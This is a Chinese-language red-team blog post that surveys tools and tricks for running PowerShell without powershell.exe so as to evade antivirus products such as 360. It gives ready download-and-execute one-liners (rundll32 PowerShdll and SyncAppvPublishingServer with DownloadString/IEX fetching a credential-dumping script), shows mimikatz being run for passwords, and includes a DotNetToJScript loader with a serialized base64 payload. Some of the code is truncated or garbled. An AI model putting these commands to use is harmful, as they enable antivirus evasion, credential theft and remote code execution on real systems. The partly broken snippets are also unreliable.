# 无powershell运行powershell方法总结

今天给大家带来的是，无powershell运行powershell的一些姿势的分享，由于powershell的特性，使得它很受渗透测试爱好者的喜爱，当然也催生了像ASMI之类的防御手段，当然各类杀软也是把它纳入了查杀行列中，比如某套装，只要你调用PS就会查杀，着实恶心。

![v2-7aa75c9a5348bf9b89794c1028d63102\_hd.j](https://pic3.zhimg.com/80/v2-7aa75c9a5348bf9b89794c1028d63102\_hd.jpg)

所以我们在与\*\*的对抗中也会想法设法的去bypass来执行PS，这里我便总结了几种无powershell执行powershell的姿势，希望能在实战的时候帮到大家。

下面是总结的列表：

* PowerLine
* PowerShdll
* Nopowershell
* SyncAppvPublishingServer
* 调用MSBuild.exe
* 调用cscript\


下面的实验如无特殊说明，均在windows server 2008 sp2 + 360最新版下进行

PowerLine

PowerLine是一款由c#编写的工具，支持本地命令行调用和远程调用，可以在不直接调用PowerShell的情况下调用PowerShell脚本，优点如下：

* 自动识别win7、win10系统
* 使用方便,无需复杂的ide
* 自动xor编码
* 等

下载地址：

[https://github.com/fullmetalcache/PowerLine](https://github.com/fullmetalcache/PowerLine)

我们来看一下它的使用方法：

首先拉取项目到本地，然后运行build.bat文件

![v2-b19a332b9c48e18c2ae422d1602f0600\_hd.j](https://pic1.zhimg.com/80/v2-b19a332b9c48e18c2ae422d1602f0600\_hd.jpg)

然后在UserConf.xml文件中填写你所需要调用的powershell脚本的地址，默认自带powerup、powerview、Mimikatz等，只要按照他给定的格式加入你的ps脚本地址即可

![v2-c7bddf87384428ef971c72c5d09392fd\_hd.j](https://pic2.zhimg.com/80/v2-c7bddf87384428ef971c72c5d09392fd\_hd.jpg)

加入完成以后，运行PLBuilder.exe进行构建，构建过程中，360无提示

![v2-daf9f3bb37ee598ffb2f2a530d7c6b8d\_hd.j](https://pic3.zhimg.com/80/v2-daf9f3bb37ee598ffb2f2a530d7c6b8d\_hd.jpg)

查看内置的脚本PowerLine.exe -ShowScripts

![v2-dcef66a815c1a2db4081c002a4a26cb4\_hd.j](https://pic3.zhimg.com/80/v2-dcef66a815c1a2db4081c002a4a26cb4\_hd.jpg)

运行脚本，360无提示

![v2-19a84fc4e0f055c7c53d10f65d5423b2\_hd.j](https://pic3.zhimg.com/80/v2-19a84fc4e0f055c7c53d10f65d5423b2\_hd.jpg)

但是在运行之后，360提示了报毒，并删掉了我的exe文件...一般\*\*只是检测PS发出的恶意请求，但由于在powerline中，请求是由powerline发出的，便绕过了一部分\*\*，但是缺点也是很明显，就是可扩展性太差，所有的功能依赖于配置文件...

PowerShdll

这个工具主要使用dll去运行powershell而不需要去连接powershell.exe,所以具有一定的bypass\*\*能力，当然它也可以在这几个程序下运行rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsv\*\*\*.exe或者使用作者给出的单独的exe进行执行

下载地址：

[https://github.com/p3nt4/PowerShdll.git](https://github.com/p3nt4/PowerShdll.git)

exe版使用方法：

使用PowerShdll -i进入到交互模式，此时便获得了一个交互式的PS环境，可执行任意的powershell命令，整个过程360无拦截

![v2-0ae862b686a3088aaa82373936e1cd65\_hd.j](https://pic3.zhimg.com/80/v2-0ae862b686a3088aaa82373936e1cd65\_hd.jpg)

下载mimikatz抓取密码，360全程无反应...

![v2-355a8fd9d022cc77bd05b81229fec460\_hd.j](https://pic4.zhimg.com/80/v2-355a8fd9d022cc77bd05b81229fec460\_hd.jpg)

在交互式模式下唯一要注意的就是，你输入的内容不能过长，否则会出现问题，原因未可知....

我们再来看一下dll版的用法..

```bash
rundll32 PowerShdll.dll,main . { iwr -useb https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1 } ^| iex;
```

这次没有那么好运了，直接被360杀了

![v2-ff8e0c8659f2c9a0d46f6f0984d4373d\_hd.j](https://pic1.zhimg.com/80/v2-ff8e0c8659f2c9a0d46f6f0984d4373d\_hd.jpg)

Nopowershell

NoPowerShell是用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。同时也提供了CS下的cna脚本。

优点：

* 执行隐秘
* 功能强大
* 扩展简单
* 即使不熟悉PS命令也可以使用cmd命令来代替PS命令，例如(使用ping来代替Test-NetConnection)

下载地址：

[https://github.com/bitsadmin/nopowershell.git](https://github.com/bitsadmin/nopowershell.git)

我们来看一下它的用法：

直接运行便会输出它的版本和支持的命令

![v2-5bb8d41f49533681621c9711396dafe9\_hd.j](https://pic3.zhimg.com/80/v2-5bb8d41f49533681621c9711396dafe9\_hd.jpg)

过程360无拦截

而dll版被秒杀..

![v2-d8d4c0af1e654a5cc404733d04a88b19\_hd.j](https://pic1.zhimg.com/80/v2-d8d4c0af1e654a5cc404733d04a88b19\_hd.jpg)

cs下稳定..

![v2-4bb2cf81da77ba1be4b7ad8a373c7951\_hd.j](https://pic2.zhimg.com/80/v2-4bb2cf81da77ba1be4b7ad8a373c7951\_hd.jpg)

这里要注意一点的是，脚本默认调用scripts下的文件，国内的cs大多为script目录，自行修改文件内的目录即可。

了解了相关的知识，我们在实操中是怎么运用呢？登录合天网安实验室寻找答案。

相关实验：CobaltStrike之代理和powershell

[实验:CobaltStrike之代理和powershell](http://www.hetianlab.com/expc.do?ec=ECID9d86-e94a-4c2f-ae12-ab36f212551b)

SyncAppvPublishingServer

SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本，我们可以使用他们来做一些类似PS的操作

默认存放在C:\Windows\System32下面

![v2-c8a15002fffa1f7fafc621d5a641280a\_hd.j](https://pic3.zhimg.com/80/v2-c8a15002fffa1f7fafc621d5a641280a\_hd.jpg)

用法实例：

弹计算机：

```
C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; Start-Process Calc.exe ”
```

![v2-930494ab6efee445a9cc19d3d67d37b2\_hd.j](https://pic4.zhimg.com/80/v2-930494ab6efee445a9cc19d3d67d37b2\_hd.jpg)

或者：

```
C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; iwr http://192.168.1.149:443"
```

![v2-1134f3f8d147184d8b23149e203c73e4\_hd.j](https://pic4.zhimg.com/80/v2-1134f3f8d147184d8b23149e203c73e4\_hd.jpg)

你也可以去远程下载执行一些ps脚本就像下面这样：

```bash
C:\Windows\System32\SyncAppvPublishingServer.exe \
" Break; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1','$env:USERPROFILE/1.ps1'); Start-Process '$env:USERPROFILE/1.ps1' -WindowStyle Minimized;"
```

```bash
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1') | IEX"
```

调用MSBuild.exe：

MSBuild是.Net框架中包含的工具，用于自动化创建软件产品的过程，包括编译源代码，打包，测试，部署和创建文档。

Msbuild依赖于.csproj文件，该文件具有XML语法，包含了.NET构建过程中的结果，类似于unix中的make，代码如下：

```
outputs = MyPipeline.Invoke(); 
MyRunspace.Close(); 
StringBuilder sb = new StringBuilder(); 
foreach (PSObject pobject in outputs) { sb.AppendLine(pobject.ToString()); 
} return sb.ToString(); }} ]]>< / Code>
```

test.ps1的内容如下

```
echo "hello from powershell-less"echo "this is your pid:$PID"$psversiontable
```

效果：

![v2-59f23238959a2b978143ea7f2319f15f\_hd.j](https://pic1.zhimg.com/80/v2-59f23238959a2b978143ea7f2319f15f\_hd.jpg)

全程360无提示..

github上也有类似的项目：[https://github.com/Cn33liz/MSBuildShell.git](https://github.com/Cn33liz/MSBuildShell.git)

执行完之后获得一个交互式的PS

![v2-bf5b52a3e899d776abb70e849aa50593\_hd.j](https://pic3.zhimg.com/80/v2-bf5b52a3e899d776abb70e849aa50593\_hd.jpg)

调用cscript：

github上有一个开源的项目[https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)，可以直接生产一个.js的文件，用法是

```
Dotnettojscript.exe > testps.js
```

现在作者给出来编译好的版本，但是里面总是有一些问题总是提示：

```
Error: loading assembly information.The generated script might not work correctly
```

所以我们下载下来，进行手动编译..

首先使用vs打开项目，然后切换到TestClass.cs，并注释掉MessageBox这个方法，不然每次运行都会得到一个messageBox

![v2-55490b44a2bbaa1b1dfe72bb979b0c78\_hd.j](https://pic3.zhimg.com/80/v2-55490b44a2bbaa1b1dfe72bb979b0c78\_hd.jpg)

然后，因为需要调用PS，所以我们需要引入”System.Management.Automation.Runspaces”，“ System.Management.Automation“，我们可以在PS下使用下面的命令进行查询该dll的位置，然后手动引入

```
[psobject].Assembly.Location
```

![v2-e7b5329bbd4321c8e29ffa6f5f555877\_hd.j](https://pic2.zhimg.com/80/v2-e7b5329bbd4321c8e29ffa6f5f555877\_hd.jpg)

引入之后，并且在TestClass中加入以下方法：

```
private string LoadScript(string filename) { string buffer =""; try { buffer = File.ReadAllText(filename); } catch (Exception e) { return ""; } return buffer; } public void RunScript(string filename) { Runspace MyRunspace = RunspaceFactory.CreateRunspace(); MyRunspace.Open(); Pipeline MyPipeline = MyRunspace.CreatePipeline(); string script=LoadFile(filename); MyPipeline.Commands.AddScript(script); MyPipeline.Commands.Add("Out-String"); Collection outputs = MyPipeline.Invoke(); MyRunspace.Close(); StringBuilder sb = new StringBuilder(); foreach (PSObject pobject in outputs) { sb.AppendLine(pobject.ToString()); } Console.WriteLine(sb.ToString());}
```

编译完得到Dotnettojscript.exe、ExampleAssembly.dll两个文件，然后我们继续将我们的test.ps1文件进行生成一个js文件，

其内容如下：

```
function setversion() {}function debug(s) {}function base64ToStream(b) { var enc = new ActiveXObject("System.Text.ASCIIEncoding"); var length = enc.GetByteCount_2(b); var ba = enc.GetBytes_4(b); var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform"); ba = transform.TransformFinalBlock(ba, 0, length); var ms = new ActiveXObject("System.IO.MemoryStream"); ms.Write(ba, 0, (length / 4) * 3); ms.Position = 0; return ms;} var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0lud**rZQoEAwAA"+"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZ**TZXJpYWxpemF0aW9u"+"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0lud**rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+"ZW1ibHkGFwAAAARMb2FkCg8MAAAAUAAAAAJlY2hvICJoZWxsbyBmc**tIHBvd2Vyc2hlbGwtbGVz"+"cyINCmVjaG8gInRoaXMgaXMgeW91ciBwaWQ6JFBJRCINCiRwc3ZlcnNpb250YWJsZQENAAAABAAA"+"AAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0"+"ZVtdKQgAAAAKCwAA";var entry_class = 'TestClass'; try { setversion(); var stm = base64ToStream(serialized_obj); var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); var al = new ActiveXObject('System.Collections.ArrayList'); var d = fmt.Deserialize_2(stm); al.Add(undefined); var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); } catch (e) { debug(e.message);} 解密后的主要逻辑如下： var entry_class = 'TestClass';try {setversion();var stm = base64ToStream(serialized_obj);var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');var al = new ActiveXObject('System.Collections.ArrayList');var d = fmt.Deserialize_2(stm); al.Add(undefined);var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);o.RunScript("c:\\test\\test.ps1");} catch (e) {debug(e.message);}
```

运行结果：

当然你也可以用下面的方法如绕过对JS后缀的检测

```
cscript //e:jscript testps.txt
```

但是360无情的杀死了我们....

![v2-03f43a71253a31846977de882b9b4e13\_hd.j](https://pic4.zhimg.com/80/v2-03f43a71253a31846977de882b9b4e13\_hd.jpg)

写在后面：

本文仅对网上常见的无PS运行PS的手段进行了总结，实验过程大家也可以看的出来，是可以bypass一些\*\*的，也是各有各的优缺点，最好是针对不同的\*\*去找出它的拦截规则，然后再进行对于的bypass操作。

参考文章：

[https://www.slideshare.net/dafthack/pwning-the-enterprise-with-powershell](https://www.slideshare.net/dafthack/pwning-the-enterprise-with-powershell)

[https://www.slideshare.net/dafthack/red-team-apocalypse-rvasec-edition](https://www.slideshare.net/dafthack/red-team-apocalypse-rvasec-edition)

[https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/](https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/)

[https://www.\*\*\*\*\*\*\*.com/watch?v=7tvfb9poTKg\&feature=youtu.be](https://www.\*\*\*\*\*\*\*.com/watch?v=7tvfb9poTKg\&feature=youtu.be)
